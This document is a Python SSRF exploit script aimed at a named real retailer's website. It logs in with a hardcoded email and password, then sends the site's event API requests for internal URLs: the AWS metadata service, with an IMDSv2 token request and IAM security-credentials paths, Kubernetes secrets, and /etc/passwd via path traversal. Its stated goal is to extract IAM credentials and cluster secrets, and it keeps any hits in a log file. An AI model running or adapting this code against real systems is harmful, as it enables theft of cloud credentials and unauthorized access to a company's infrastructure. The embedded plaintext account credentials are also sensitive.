#!/usr/bin/env python3
"""
Extract REAL Impact from SSRF - All techniques
Goal: Get actual data (IAM credentials, K8s secrets) to prove real impact
"""
import requests
import json
import time
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"
critical_findings = []

def log_critical(title, details, data=None):
    finding = {
        "timestamp": datetime.now().isoformat(),
        "severity": "CRITICAL",
        "title": title,
        "details": details,
        "data": data
    }
    critical_findings.append(finding)
    print(f"\n[🔥 CRITICAL] {title}")
    print(f"   {details}")
    if data:
        print(f"   Data: {str(data)[:300]}")

print("="*70)
print("REAL IMPACT EXTRACTION")
print("="*70)

# Test 1: Try to get data via error messages
print("\n[1] ERROR-BASED EXTRACTION...")
error_triggers = [
    "http://169.254.169.254/latest/meta-data/instance-id/../../etc/passwd",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/../../etc/passwd",
]

for trigger in error_triggers:
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": trigger}, timeout=10)
        if resp.status_code != 200 or (resp.text and resp.text != "{}" and len(resp.text) > 10):
            if any(kw in resp.text.lower() for kw in ["instance", "role", "secret", "token", "i-"]):
                log_critical("Error-Based Data Leak", f"Error contains data: {trigger}", resp.text[:500])
    except: pass

# Test 2: Try different HTTP methods
print("\n[2] HTTP METHODS TEST...")
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
targets = [
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
]

for target in targets:
    for method in methods:
        try:
            resp = s.post(f"{base}{ssrf_endpoint}", json={"url": target, "method": method}, timeout=10)
            if resp.text and resp.text != "{}" and len(resp.text) > 10:
                if not any(err in resp.text.lower() for err in ["error", "not found", "forbidden"]):
                    log_critical(f"Data via {method}", f"Got data using {method} method", resp.text[:500])
        except: pass

# Test 3: Try different Accept headers
print("\n[3] ACCEPT HEADERS TEST...")
accept_headers = ["text/plain", "application/json", "text/html", "*/*", ""]
for target in targets:
    for accept in accept_headers:
        try:
            headers = {"Accept": accept} if accept else {}
            resp = s.post(f"{base}{ssrf_endpoint}", json={"url": target, "headers": headers}, timeout=10)
            if resp.text and resp.text != "{}" and len(resp.text.strip()) > 5:
                if not any(err in resp.text.lower() for err in ["error", "not found"]):
                    log_critical(f"Data via Accept: {accept}", f"Got data with Accept header", resp.text[:500])
        except: pass

# Test 4: Try response headers for leaks
print("\n[4] RESPONSE HEADERS ANALYSIS...")
test_urls = [
    "http://169.254.169.254/latest/meta-data/instance-id",
    "https://kubernetes.default.svc/api/v1/namespaces/default/secrets?limit=1",
]
for url in test_urls:
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={"url": url}, timeout=10)
        for h_name, h_value in resp.headers.items():
            if any(kw in h_value.lower() for kw in ["instance", "role", "secret", "token", "credential", "i-"]):
                log_critical("Header Data Leak", f"Found data in {h_name}", {h_name: h_value})
    except: pass

# Test 5: Try IMDSv2
print("\n[5] AWS IMDSv2 TOKEN EXTRACTION...")
try:
    resp1 = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/api/token",
        "method": "PUT",
        "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    }, timeout=15)
    if resp1.status_code == 200 and resp1.text and resp1.text != "{}" and len(resp1.text.strip()) > 10:
        token = resp1.text.strip()
        log_critical("IMDSv2 Token Obtained", f"Got token: {token[:50]}...", token)
        
        # Use token
        resp2 = s.post(f"{base}{ssrf_endpoint}", json={
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "headers": {"X-aws-ec2-metadata-token": token}
        }, timeout=15)
        if resp2.text and resp2.text != "{}" and len(resp2.text.strip()) > 5:
            log_critical("IAM Role via IMDSv2", "Got IAM role name", resp2.text[:200])
except Exception as e:
    print(f"   Error: {e}")

# Save results
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_file = f"logs/real_impact_{timestamp}.json"
with open(output_file, 'w', encoding='utf-8') as f:
    json.dump(critical_findings, f, indent=2, ensure_ascii=False)

print("\n" + "="*70)
print(f"[+] Results saved to: {output_file}")
print(f"[+] Critical findings: {len(critical_findings)}")
print("="*70)

if critical_findings:
    print("\n🔥 REAL IMPACT DETECTED!")
    for i, f in enumerate(critical_findings, 1):
        print(f"\n{i}. {f['title']}")
        print(f"   {f['details']}")
else:
    print("\n[!] No real impact extracted yet.")
    print("[!] Need DNS logger or webhook for exfiltration.")





